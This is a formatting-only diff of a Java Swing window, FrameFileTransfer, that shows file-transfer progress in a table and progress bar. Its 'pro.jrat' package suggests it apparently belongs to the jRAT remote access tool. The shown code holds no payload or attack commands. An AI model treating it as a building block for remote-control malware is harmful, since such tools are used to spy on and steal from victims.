@@ -25,11 +25,9 @@ import javax.swing.table.DefaultTableModel;
 import pro.jrat.ui.renderers.table.FileTransferTableRenderer;
 import pro.jrat.utils.IconUtils;
 
-
-
 @SuppressWarnings("serial")
 public class FrameFileTransfer extends BaseFrame {
-	
+
 	public static FrameFileTransfer instance;
 
 	private JPanel contentPane;
@@ -40,21 +38,21 @@ public class FrameFileTransfer extends BaseFrame {
 
 	public String file;
 	private JLabel label;
-	
+
 	public int getRow(String path) {
 		for (int i = 0; i < model.getRowCount(); i++) {
 			if (model.getValueAt(i, 1).toString().equalsIgnoreCase(path)) {
 				return i;
 			}
 		}
-		
+
 		return -1;
 	}
 
 	public void load(String name) {
 		Icon icon = IconUtils.getFileIconFromExtension(name, false);
 		String status = "0";
-		
+
 		model.addRow(new Object[] { icon, name, status });
 		progressBar.setMaximum(model.getRowCount() * 100);
 	}
@@ -96,26 +94,8 @@ public class FrameFileTransfer extends BaseFrame {
 
 		label = new JLabel("...");
 		GroupLayout gl_contentPane = new GroupLayout(contentPane);
-		gl_contentPane.setHorizontalGroup(
-			gl_contentPane.createParallelGroup(Alignment.TRAILING)
-				.addGroup(gl_contentPane.createSequentialGroup()
-					.addComponent(label, GroupLayout.DEFAULT_SIZE, 487, Short.MAX_VALUE)
-					.addPreferredGap(ComponentPlacement.RELATED)
-					.addComponent(btnHide))
-				.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 544, Short.MAX_VALUE)
-				.addComponent(progressBar, GroupLayout.DEFAULT_SIZE, 544, Short.MAX_VALUE)
-		);
-		gl_contentPane.setVerticalGroup(
-			gl_contentPane.createParallelGroup(Alignment.TRAILING)
-				.addGroup(gl_contentPane.createSequentialGroup()
-					.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 326, Short.MAX_VALUE)
-					.addPreferredGap(ComponentPlacement.RELATED)
-					.addComponent(progressBar, GroupLayout.PREFERRED_SIZE, 26, GroupLayout.PREFERRED_SIZE)
-					.addPreferredGap(ComponentPlacement.RELATED)
-					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
-						.addComponent(btnHide)
-						.addComponent(label)))
-		);
+		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addGroup(gl_contentPane.createSequentialGroup().addComponent(label, GroupLayout.DEFAULT_SIZE, 487, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnHide)).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 544, Short.MAX_VALUE).addComponent(progressBar, GroupLayout.DEFAULT_SIZE, 544, Short.MAX_VALUE));
+		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 326, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addComponent(progressBar, GroupLayout.PREFERRED_SIZE, 26, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnHide).addComponent(label))));
 
 		table = new JTable() {
 			@SuppressWarnings({ "unchecked", "rawtypes" })
@@ -127,13 +107,7 @@ public class FrameFileTransfer extends BaseFrame {
 				return super.getColumnClass(column);
 			}
 		};
-		table.setModel(model = new DefaultTableModel(
-			new Object[][] {
-			},
-			new String[] {
-				" ", "File Path", "Progress"
-			}
-		) {
+		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { " ", "File Path", "Progress" }) {
 			public boolean isCellEditable(int row, int column) {
 				return false;
 			}
@@ -142,7 +116,7 @@ public class FrameFileTransfer extends BaseFrame {
 		table.getColumnModel().getColumn(1).setPreferredWidth(388);
 		table.getColumnModel().getColumn(2).setPreferredWidth(133);
 		table.setDefaultRenderer(Object.class, new FileTransferTableRenderer());
-		
+
 		table.getTableHeader().setReorderingAllowed(false);
 		table.setRowHeight(25);
 		scrollPane.setViewportView(table);
@@ -150,9 +124,9 @@ public class FrameFileTransfer extends BaseFrame {
 	}
 
 	public void exit() {
-		
+
 	}
-	
+
 	public void reset() {
 		while (model.getRowCount() > 0) {
 			model.removeRow(0);
@@ -164,12 +138,16 @@ public class FrameFileTransfer extends BaseFrame {
 			progressBar.setMaximum(100);
 			progressBar.setValue(i);
 			model.setValueAt(i, getRow(path), 2);
-		} catch (Exception ex) { }
+		} catch (Exception ex) {
+		}
 		label.setText("Transferring " + new File(path).getName() + " " + (bytes / 1024) + "/" + (all / 1024) + " kB");
 	}
 
 	public void done(String path, String bytes) {
-		try { model.setValueAt("100", getRow(path), 2); } catch (Exception ex) { }
+		try {
+			model.setValueAt("100", getRow(path), 2);
+		} catch (Exception ex) {
+		}
 		label.setText("Finished " + new File(path).getName());
 		progressBar.setValue(progressBar.getMaximum());
 	}
